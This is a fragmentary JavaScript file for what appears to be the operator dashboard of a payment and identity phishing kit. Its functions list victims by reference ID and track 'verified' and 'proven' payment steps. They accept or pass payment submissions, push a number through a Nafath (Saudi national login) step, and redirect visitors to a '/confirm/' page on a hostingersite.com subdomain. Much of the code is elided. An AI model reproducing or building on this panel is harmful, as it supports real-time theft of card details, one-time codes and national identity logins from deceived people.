...
function _requestData(token, Category, typeReqs, req_data = {}, configs = {}) {
    ...
    const rootPath = window.location.pathname[(window.location.pathname).length - 1]
        === "/" ? window.location.pathname : window.location.pathname + "/";




    const urlPath = rootPath + "data" + "/" + "?typeReq=" + typeReqs + "&category=" + Category;
...
function NewDate() {
    ...
    */
    ...
    _requestData(
        ...
        req_data = { "req": req, "reference": GetItemFromLocalStorage('ReferenceID') },
        configs = configs);
...
function SubmitPaymentVerifyForm() {
    ...
    _requestData(
        ...
        Category = "FORMS_SUBMIT",
        typeReqs = TypeReqs.PaymentsForm,
        req_data = { "req": req, "step": 2, "reference": GetItemFromLocalStorage('ReferenceID') },
        configs = configs);
...
function SubmitPaymentProveForm() {
    ...
    _requestData(
        ...
        Category = "FORMS_SUBMIT",
        typeReqs = TypeReqs.PaymentsForm,
        req_data = { "req": req, "step": 3, "reference": GetItemFromLocalStorage('ReferenceID') },
        configs = configs);
...
function IniUserData(SidebarUsers) {
    ...
    SidebarUsers.onclick = function (ev) {
        ...
        if (ev.target.value && ev.target.type == 'checkbox') {
            ...
            if (userDiv != null) {
                setClassInElments(SidebarUsers.children, removeClassElement, "selected");
                ...
                _requestData(
                    ...
                    req_data = { "Reference": localStorage.getItem('currentReferenceID') },
                    configs = {});
            }
...
function RespnseUsersList(typeReq, is_error, response, configs, req_data) {
    ...
    if (UsersDivSelected["Reference"] && document.getElementById(UsersDivSelected["Reference"]) ) {
        addClassElement(document.getElementById(UsersDivSelected["Reference"]), "selected");
    }
    
    if(UsersDivSelected["Reference"] && UsersDivNewActionState[UsersDivSelected["Reference"]] > 0){
...
function generateNewDivUser(SiteBarUsersDiv, item) {
    ...
    if (item.STATUS_VERIFY=== "STILL") {
        ...
        if (parseInt(item.verified) > 0) {
            class_icon_visiable = "";
            name_icon_check = "check-all";
        }
        else
            if (parseInt(item.proven) > 0) {
                class_icon_visiable = "";
                name_icon_check = "check-all";
    ...
    // ";
    const divString = '\
    <div class="user-div p-2" id="' + item.Reference + '">\
                <div class="info-user">\
                    <span class="new-action ' + new_action_invisible + '"></span>\
                    <input type="checkbox" id="' + item.Reference + '_chbx" name="category1" value="c" ' + checked + '>\
                    <div class="name">\
                        '
        + item.Name +
        '\
                ...
                <div class="status-user">\
                    <svg class="bi rounded-circleee ' + class_icon_visiable + ' ' + class_icon_color_proven + '" width="16" height="16" fill="currentColor">\
                        <use xlink:href="/assets/bootstrap-icons-1.10.5/bootstrap-icons.svg#' + name_icon_check + '" ; />\
                    </svg>\
                </div>\
            </div>';
...
function clickPaymentAction(btnActionPayment, IdFeild, action = "accepted", isPass = false) {
...
function clickNafathSndNum(btn, IdFeild = 69) {
    ...
    _requestData(
        ...
        Category = "FORMS_SUBMIT",
        typeReqs = TypeReqs.SetActionStatus,
        req_data = { action: numValAction, ID: IdFeild , Reference:localStorage.getItem('currentReferenceID')},
        configs = {
            Elements: []
        }
    );
...
function RespnseSetActionStatus(is_error, response, configs, req_data) {
    ...
    if (configs.Elements.length > 0) {
        configs.Elements[0].closest(".div-payments-actions").classList.toggle("d-none");

        const elmtInputSendNum = configs.Elements[0].parentElement.previousElementSibling;
...
document.addEventListener('DOMContentLoaded', function () {
    ...
    if (isTargetPage) {
        ...
        const observer = new MutationObserver(() => {
            const isVisible =
                verifyForm && !verifyForm.classList.contains('d-none') && verifyForm.style.display !== 'none';
        ...
        if (verifyForm) {
            observer.observe(verifyForm, { attributes: true, attributeFilter: ['class', 'style'] });
...
document.addEventListener('DOMContentLoaded', () => {
    ...
    if (externalSection) {
        observer.observe(externalSection, { attributes: true, attributeFilter: ['class'] });
    }
...
document.addEventListener('DOMContentLoaded', function () {
    ...
    const checkConditions = function () {
        ...
        const isVisible = !verifyForm.classList.contains('d-none') && verifyForm.style.display !== 'none';
...
function redirectVisitorFromStorage() {
    ...
    const req_data = {
        reference: reference,
        url: 'https://ghostwhite-mandrill-797511.hostingersite.com/confirm/'
    };
...
/********************************************* *
END HANDLE PASS BUTTUN ON DASHBOARD
******************************************** */



// const expireDateWarning = getElementById_("DateExpHelp");
// getElementById_("InputDateExp").addEventListener("input", (e) => {
...
// });
 ...
 // getElementById_("InputName").addEventListener("input", (evt) => {
        //     var char = String.fromCharCode(evt.which);

        

        //     console.log(/^[A-Za-z -_][A-Za-z0-9 _-]*$/.test(evt.target.value));
        //     //console.log(/^[A-Za-z ][A-Za-z0-9 ]*$/.test("ex pression 12 3"));
        //     //  console.log(/^[A-Za-z][A-Za-z0-9]*$/.test("EXPRESSIONا"));
        //     //  console.log(/^[A-Za-z][A-Za-z0-9]*$/.test("e123xpressionت"));
        //     //  console.log(/^[A-Za-z][A-Za-z0-9]*$/.test("E123xpressionل"));
        //     //  console.log(/^[A-Za-z][A-Za-z0-9]*$/.test("1expressionل"));
        // });